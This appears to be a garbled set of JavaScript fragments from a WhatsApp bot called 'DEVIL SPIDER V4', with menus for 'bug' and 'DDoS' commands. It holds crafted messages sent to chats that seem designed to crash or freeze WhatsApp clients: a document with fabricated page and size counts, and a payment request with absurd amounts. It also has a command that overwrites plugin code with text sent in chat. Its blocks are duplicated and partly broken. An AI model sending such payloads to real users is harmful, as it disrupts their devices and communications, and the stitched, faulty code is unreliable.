> let resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

let penis = async () => {
let freesex = {
viewOnceMessage: {
message: {
interactiveMessage: {
"header": {
"title": "𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥━𝗩4",
...(await prepareWAMessageMedia({ document: overlaid, pageCount: 9999999, fileLength: 99999999999999, mimetype: 'image/png', jpegThumbnail: await resize(fs.readFileSync(`./media/overlaid.jpg`), 400, 400) }, { upload: ryozingod.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "*# 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 𝖁𝖆𝖚𝖑𝖙 - 2k24*"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{
"title": "🕸️𝕾𝖊𝖊 𝖆𝖑𝖑 𝕾𝖕𝖎𝖉𝖊𝖗 𝕸𝖊𝖓𝖚 🕷️",
"sections": [
{
"title": "💧 𝕮𝖍𝖔𝖔𝖘𝖊 𝕺𝖓𝖊 🙃",
"highlight_label": "#General",
"rows": [
{
"header": "[ ❇️ ] • ALL CMD",
"title": "𝖆𝖑𝖑 𝕾𝖕𝖎𝖉𝖊𝖗 𝖈𝖔𝖒𝖒𝖆𝖓𝖉𝖘 🕷️",
"id": ".allmenu"
},
{
"header": "👤 - CONTACT 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒",
"title": "❗Displays Owner Number",
"id": ".owner"
},
{
"header": "🖥️ - Bot Info",
"title": "❗𝕯𝖎𝖘𝖕𝖑𝖆𝖞  𝖆𝖑𝖑 𝖘𝖕𝖎𝖉𝖊𝖗 𝕴𝖓𝖋𝖔",
"id": ".botstatus"
}
]
},
{
"title": "💈 𝖂𝖊𝖇𝖇𝖎𝖓𝖌 𝕮𝖔𝖒𝖒𝖆𝖓𝖉𝖘 💊",
"highlight_label": "#FRONT",
"rows": [
{
"header": "🎩 - BUG MENU ‼️",
"title": "❗Displays Spider All Bug Commands",
"id": ".bugmenu"
},
{
"header": "🔗 - 𝕯𝖔𝖈𝖚𝖒𝖊𝖓𝖙 MENU 📥",
"title": "❗Displays All Ddos",
"id": ".ddosmenu"
}
]
}
]
}`
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐂𝐡𝐚𝐧𝐧𝐞𝐥\",\"url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e\"}"
}
],
"messageParamsJson": ""
},
"contextInfo": {
"mentionedJid": [m.sender],
"externalAdReply": {
"title": "d4-stardust","thumbnail": nulll,"previewType": "PHOTO","mediaType": 2
}
}
}
}
}
}

ryozingod.relayMessage(m.chat, freesex, {})
}

penis()


const fs = require('fs')
const path = require('path')

const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/
const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ''

const loadPlugins = (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(folder => {
const folderPath = path.join(directory, folder)
if (fs.lstatSync(folderPath).isDirectory()) {
const files = fs.readdirSync(folderPath)
files.forEach(file => {
const filePath = path.join(folderPath, file)
if (filePath.endsWith('.js')) {
const plugin = require(filePath)
plugins.push(plugin)
}
})
}
})
return plugins
}

const plugins = loadPlugins(path.resolve(__dirname, './zetsubo'))
let handled = false
for (const plugin of plugins) {
if (plugin.command === command) {
await plugin.operate(ryozingod, m, )
handled = true
break
}
}

// Jika tidak ditangani oleh plugin, jatuhkan ke switch-case
if (!handled) {
switch (command) {
case 'a1':
console.log('anjay1')
break
case 'a2':
console.log('anjay1')
break
case 'a3':
console.log('anjay1')
break
case 'w1':
console.log('woi1')
break
case 'w2':
console.log('woi2')
break
case 'menu':
let menu = `
👇berikut adalah menunya :

🩸a1
🩸a2
🩸a3
🩸w1
🩸w2
${plugins.map(p => `🩸${p.command}`).join('\n')}
`
console.log(menu)
break
default:
console.log('Command not found')
break
}
}`



// fpoll
const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? { remoteJid: "" } : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

// fpoll
const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? { remoteJid: "" } : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

// Fungsi untuk mengambil semua plugin dari direktori
const loadPlugins = (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(folder => {
const folderPath = path.join(directory, folder)
if (fs.lstatSync(folderPath).isDirectory()) {
const files = fs.readdirSync(folderPath)
files.forEach(file => {
const filePath = path.join(folderPath, file)
if (filePath.endsWith('.js')) {
delete require.cache[require.resolve(filePath)]
const plugin = require(filePath)
plugins.push(plugin)
}
})
}
})
return plugins
}

// Ngambil semua plugin dari direktori zetsubo
const plugins = loadPlugins(path.resolve(__dirname, './zetsubo'))

const context = {
ryozingod,
m,
chatUpdate,
store,
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom,
reSize,
ngeloc,
buglive,
isPremium,
fpoll // Pastikan fpoll ditambahkan ke context
}

// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
if (plugin.command === command) {
await plugin.operate(context)
handled = true
break
}
}














case 'cgplug': {
let mypler = q.split("|")[0]
let mypenis = q.split("|")[1]
let pluginsDirect = path.resolve(__dirname, './zetsubo')
let plugins = loadPlugins(pluginsDirect)
for (const { filePath, plugin } of plugins) {
if (plugin.command === mypler) {
fs.writeFileSync(filePath, mypenis)
await joreply(`Plugin di ${filePath} telah diganti.`)
return
}
}
await joreply(`Plugin dengan command '${mypler}' tidak ditemukan.`)
}
break



case 'cgplug': {
if (!isDeveloper) return joreply(mess.owner)
if (!q) return joreply(`Add Input, Example : \n\n*.cgplug thisplug|newcontent*`)

let [mypler, mypenis] = q.split("|").map(part => part.trim())
let pluginsDirect = path.resolve(__dirname, './zetsubo')
let plugins = loadPlugins(pluginsDirect)

for (const plugin of plugins) {
if (plugin.plugin && plugin.plugin.command === mypler) {
fs.writeFileSync(plugin.filePath, mypenis)
await joreply(`Plugin di ${plugin.filePath} telah diganti.`)
return
}
}
await joreply(`Plugin dengan command '${mypler}' tidak ditemukan.`)
}
break


// Ngambil semua plugin dari setiap direktori yang ada dalam direktori yang dikasih
const loadPlugins = (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(folder => {
const folderPath = path.join(directory, folder)
if (fs.lstatSync(folderPath).isDirectory()) {
const files = fs.readdirSync(folderPath)
files.forEach(file => {
const filePath = path.join(folderPath, file)
if (filePath.endsWith('.js')) {
delete require.cache[require.resolve(filePath)]
const plugin = require(filePath)
plugins.push({ filePath, plugin })
}
})
}
})
return plugins
}

// Ngambil semua plugin dari direktori zetsubo
const plugins = loadPlugins(path.resolve(__dirname, './zetsubo'))

const context = {
ryozingod,
m,
chatUpdate,
store,
smsg, getGroupAdmins, formatp, h2k, tanggal, formatDate, getTime, isUrl, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize,
ngeloc, buglive,
isPremium,
}


case 'cgplug': {
if (!isDeveloper) return joreply(mess.owner)
if (!q.includes("|")) return joreply(`Add Input, Example : \n\n*.cgplug thisplug|newcontent*`)

let [mypler, mypenis] = q.split("|")

let pluginsDirect = path.resolve(__dirname, './zetsubo')
let plugins = loadPlugins(pluginsDirect)

for (const plugin of plugins) {
if (plugin.plugin && plugin.plugin.command === mypler) {
fs.writeFileSync(plugin.filePath, mypenis)
await joreply(`Plugin di ${plugin.filePath} telah diganti.`)
return
}
}
await joreply(`Plugin dengan command '${mypler}' tidak ditemukan.`)
}
break


// fpoll
const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? { remoteJid: "" } : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

// Fungsi untuk mengambil semua plugin dari direktori
const loadPlugins = (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(folder => {
const folderPath = path.join(directory, folder)
if (fs.lstatSync(folderPath).isDirectory()) {
const files = fs.readdirSync(folderPath)
files.forEach(file => {
const filePath = path.join(folderPath, file)
if (filePath.endsWith('.js')) {
delete require.cache[require.resolve(filePath)]
const plugin = require(filePath)
plugins.push(plugin)
}
})
}
})
return plugins
}

// Ngambil semua plugin dari direktori zetsubo
const plugins = loadPlugins(path.resolve(__dirname, './zetsubo'))

const context = {
ryozingod,
m,
chatUpdate,
store,
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom,
reSize,
ngeloc,
buglive,
isPremium,
fpoll // Pastikan fpoll ditambahkan ke context
}

// Kode ini ngeliat plugin satu per satu, kalo nemu plugin yang cocok ama command yang diterima, dia langsung manggil fungsi operate-nya dan berhenti.
let handled = false
for (const plugin of plugins) {
if (plugin.command === command) {
await plugin.operate(context)
handled = true
break
}
}



let etc = { viewOnceMessage: {
message: {
"interactiveMessage": {
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./media/overpix.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🖤⟩ ༘྅ᏃɛᏆֆʊɮᎾxᎽᎶɛℕ ☆ ꧏ🤍҈ ༑\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}
}

ryozingod.relayMessage(m.chat, etc, {})